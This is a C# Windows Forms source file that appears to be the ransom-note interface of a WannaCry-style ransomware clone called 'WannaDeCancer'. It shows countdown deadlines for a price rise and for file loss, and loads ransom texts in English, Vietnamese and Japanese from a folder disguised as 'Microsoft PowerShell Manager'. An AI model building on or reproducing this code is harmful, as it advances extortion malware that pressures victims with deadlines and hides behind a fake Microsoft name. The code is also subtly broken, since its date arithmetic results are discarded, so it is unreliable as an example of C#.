using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace WannaDeCancer
{
    public partial class GUIMain : Form
    {
        public GUIMain()
        {
            InitializeComponent();
            CustomInit();
        }

        private void CustomInit()
        {
            //Each time the combobox change value, trigger the Decription()
            Description();
            cbxLang.TextChanged += CbxLang_TextChanged;

            //Time
            DateTimeCalculate();
        }

        private void DateTimeCalculate()
        {
            //Check if the time information was created or not
            if (!File.Exists(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt"))
            {
                DateTime dt = DateTime.Now;
                string stream = "Start: " + dt + "\r\nRaise: ";
                dt.AddDays(3);
                stream += dt + "\r\nLost: ";
                dt.AddDays(4);
                stream += dt;
                Static.StringtoFile(stream, @"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt");
            }

            //Get the time information
            string getTime = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF);
            string[] split = getTime.Split('\r');

            for (int i = 1; i < split.Length; i++)
            {
                split[i].Substring(1);
            }
            lbRaiseExpired.Text = split[1].Substring(7);
            lbLostExpire.Text = split[2].Substring(7);
        }

        private void CbxLang_TextChanged(object sender, EventArgs e)
        {
            Description();
        }

        /// <summary>
        /// Change the txbDecription to desired Languges
        /// </summary>
        private void Description()
        {
            switch (cbxLang.Text)
            {
                case "English":
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\EN.txt", EncodeType.UTF);
                    break;
                case "VN":
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\VI.txt", EncodeType.Unicode);
                    break;
                case "日本語":
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", EncodeType.Unicode);
                    break;
                default:
                    break;
            }
        }
    }
}
